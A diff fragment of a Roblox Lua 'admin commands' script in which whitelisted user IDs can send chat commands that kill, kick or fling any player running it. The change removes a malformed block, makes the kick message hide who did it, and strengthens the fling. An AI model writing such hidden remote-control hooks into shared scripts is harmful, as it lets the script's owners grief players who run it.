@@ -21,31 +21,19 @@ local whitelist = { owner = {1362310817}, admin = {3272600988},{3276810125},{326
                 game.Players.LocalPlayer.Character.Humanoid.Health = 0
             end
         end
-        if message:sub(1, 5) == ":1hp" then
-            if message:match(game.Players.LocalPlayer.Name) then
-                local plr = game.Players.LocalPlayer
-                game.Players.LocalPlayer.Character.Humanoid.Health = 1
-            end
-        end
-
-            if message:match(game.Players.LocalPlayer.Name) then
-                local plr = game.Players.LocalPlayer
-                game.Players.LocalPlayer.Character.Humanoid.Health = 0
-            end
-        end
         --  kill end
         -- kick start
         if message:sub(1, 5) == ":kick" then
             if message:match(game.Players.LocalPlayer.Name) then
                 local plr = game.Players.LocalPlayer
-                game.Players.LocalPlayer:Kick("\u was kicked by SoftVortex Admin Comands User. \n["..author.."]")
+                game.Players.LocalPlayer:Kick("\nxd u was kicked by who though?. \n["..author.."]")
     
             end
         end
         if message:sub(1, 6) == ":fling" then
             if message:match(game.Players.LocalPlayer.Name) then
                 local plr = game.Players.LocalPlayer
-                plr.Character.HumanoidRootPart.Velocity = Vector3.new(5000,5000,5000)
+                plr.Character.HumanoidRootPart.Velocity = Vector3.new(10000,10000,10000)
             end
         end
     
